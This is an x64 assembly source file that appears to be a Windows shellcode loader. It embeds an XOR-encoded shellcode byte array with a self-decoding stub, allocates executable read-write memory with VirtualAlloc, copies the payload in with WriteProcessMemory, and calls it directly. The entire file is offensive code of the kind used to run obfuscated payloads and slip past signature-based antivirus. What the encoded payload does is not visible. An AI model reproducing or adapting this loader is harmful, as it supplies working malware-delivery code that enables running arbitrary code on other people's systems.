; windows_loader64bits_xor.asm

extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC
extrn ExitProcess :PROC

.data
    shellcode DB 48h,31h,0c9h,48h,81h,0e9h,0feh,0ffh
DB 0ffh,0ffh,48h,8dh,05h,0efh,0ffh,0ffh
DB 0ffh,48h,0bbh,9ah,0dch,0abh,0ch,0bch
DB 63h,0b8h,0b6h,48h,31h,58h,27h,48h
DB 2dh,0f8h,0ffh,0ffh,0ffh,0e2h,0f4h,0ah
DB 4ch,3bh,9ch,2ch,0f3h,28h,26h,0ah
DB 4ch,3bh,9ch,0bch,63h,0b8h,0b6h
    endShellcode    DB 0
    hProcess        DQ ?
    baseAddr        DQ ?
    sizeShellcode   DQ ?

.code
Start PROC
    SUB     rsp, 28h
    DB 0CCh
    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    CALL    GetCurrentProcess
    MOV     hProcess, rax

    LEA     r10, shellcode
    LEA     r11, endShellcode
    SUB     r11, r10
    MOV     sizeShellcode, r11

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, sizeShellcode
    SUB     rsp, 40 
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40

    CALL    baseAddr

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess

Start ENDP
END
